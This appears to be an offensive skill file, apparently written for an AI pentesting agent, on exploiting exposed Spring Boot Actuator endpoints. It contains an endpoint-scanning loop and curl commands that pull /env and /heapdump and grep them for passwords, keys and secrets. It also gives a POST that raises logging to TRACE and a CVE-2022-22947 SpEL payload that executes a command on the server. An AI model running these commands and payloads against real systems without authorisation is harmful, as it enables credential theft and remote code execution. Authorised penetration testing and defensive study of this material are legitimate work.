---
name: actuator-endpoints
description: Spring Boot Actuator exposure — /actuator/*, /env, /heapdump, /jolokia, /mappings leaking secrets, config, and enabling RCE. Use when Spring Boot is fingerprinted (whitelabel error, spring headers, /actuator/health 200).
category: misconfig-exposure
---

# Spring Boot Actuator Exposure

## Detection
```powershell
$paths = @("actuator", "actuator/env", "actuator/health", "actuator/heapdump", "actuator/mappings", "actuator/beans", "actuator/configprops", "actuator/gateway/routes", "actuator/jolokia", "actuator/metrics", "actuator/loggers", "actuator/httptrace")
foreach ($p in $paths) {
    $code = curl.exe -s -o $null -w '%{http_code}' "$U/$p"
    echo "$code /$p"
}
```

## Exploitation
1. **/env** → config properties: DB creds, API keys, AWS keys (redacted but often with password values).
2. **/heapdump** → download and grep strings for secrets/tokens/passwords in memory.
3. **/mappings** → full route map → hidden endpoints (BFLA surface).
4. **/loggers** → set `ROOT` to `DEBUG` or `TRACE` via POST → sensitive logging leak; `logfile` endpoint serves logs.
5. **/gateway/routes** (Spring Cloud Gateway) → **CVE-2022-22947**: POST `/actuator/gateway/routes/hack` with `SpEL` in filters → RCE.
6. **/jolokia** → MBean exec (CVE-2017-1000486) → RCE.
7. **/configprops** → shows configuration with secrets sometimes.

## Payloads
```json
POST /actuator/loggers/ROOT {"configuredLevel":"TRACE"}
POST /actuator/gateway/routes/hack {"id":"hack","filters":[{"name":"AddResponseHeader","args":{"Name":"X","Value":"#{T(java.lang.Runtime).getRuntime().exec('id')"}}],"uri":"http://x"}
```

## Tool Commands
```powershell
curl.exe -s "$U/actuator/env" | python -m json.tool | findstr /i "password api key secret"
curl.exe -s -o heap "$U/actuator/heapdump" && strings heap | findstr /i "password api key secret" | select -First 20
curl.exe -s -X POST "$U/actuator/loggers/ROOT" -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'
```

## Verification & Evidence
- Recovered secret/config route/exec — capture the sensitive value (redacted) + repro.